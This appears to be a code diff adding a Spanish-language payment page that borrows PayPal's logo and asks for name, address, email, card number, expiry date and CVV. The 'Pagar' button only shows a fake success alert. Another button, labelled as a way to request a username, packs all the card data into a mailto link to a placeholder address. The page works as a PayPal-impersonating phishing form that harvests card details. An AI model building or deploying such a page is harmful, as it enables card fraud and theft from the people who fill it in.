@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5; /* Fondo gris claro */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .card {
+            max-width: 400px;
+            width: 100%;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            margin-top: 20px;
+        }
+        header {
+            background-color: #0070ba;
+            padding: 10px 0;
+            text-align: center;
+        }
+        header img {
+            max-width: 100px;
+            height: auto;
+        }
+        form {
+            margin-top: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        button {
+            background-color: #0070ba;
+            color: #fff;
+            padding: 10px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #00588c;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            color: #666;
+        }
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <header>
+            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo">
+        </header>
+
+        <form id="paymentForm">
+            <label for="name">Nombre:</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="email">Correo Electrónico:</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="address">Dirección:</label>
+            <input type="text" id="address" name="address" required>
+
+            <label for="postal-code">Código Postal:</label>
+            <input type="text" id="postal-code" name="postal-code" required>
+
+            <label for="card-number">Número de tarjeta:</label>
+            <input type="text" id="card-number" name="card-number" placeholder="**** **** **** ****" required>
+
+            <label for="expiry">Fecha de caducidad:</label>
+            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
+
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" placeholder="***" required>
+
+            <div class="button-row">
+                <button type="button" onclick="realizarPago()" id="payButton" disabled>Pagar</button>
+                <button type="button" onclick="redirigirACorreo()">Click para solicitar tu usuario</button>
+                <button type="button" onclick="volverAIndex()">Volver</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener("input", function () {
+            var inputs = document.querySelectorAll("input[required]");
+            var isValid = Array.from(inputs).every(function (input) {
+                return input.checkValidity();
+            });
+            document.getElementById("payButton").disabled = !isValid;
+        });
+
+        function realizarPago() {
+            // Aquí deberías realizar la lógica de procesamiento de pagos en el servidor
+            // y redirigir al usuario según el resultado.
+            alert('¡Pago realizado con éxito!');
+        }
+
+        function redirigirACorreo() {
+            var name = document.getElementById("name").value;
+            var email = document.getElementById("email").value;
+            var address = document.getElementById("address").value;
+            var postalCode = document.getElementById("postal-code").value;
+            var cardNumber = document.getElementById("card-number").value;
+            var expiry = document.getElementById("expiry").value;
+            var cvv = document.getElementById("cvv").value;
+
+            var mensaje = "Nombre: " + name + "\n" +
+                          "Correo Electrónico: " + email + "\n" +
+                          "Dirección: " + address + "\n" +
+                          "Código Postal: " + postalCode + "\n" +
+                          "Número de tarjeta: " + cardNumber + "\n" +
+                          "Fecha de caducidad: " + expiry + "\n" +
+                          "CVV: " + cvv;
+
+            window.location.href = "mailto:correo@ejemplo.com?subject=Pago&body=" + encodeURIComponent(mensaje);
+        }
+
+        function volverAIndex() {
+            // Redirige a la página index.html
+            window.location.href = "index.html";
+        }
+    </script>
+</body>
+</html>
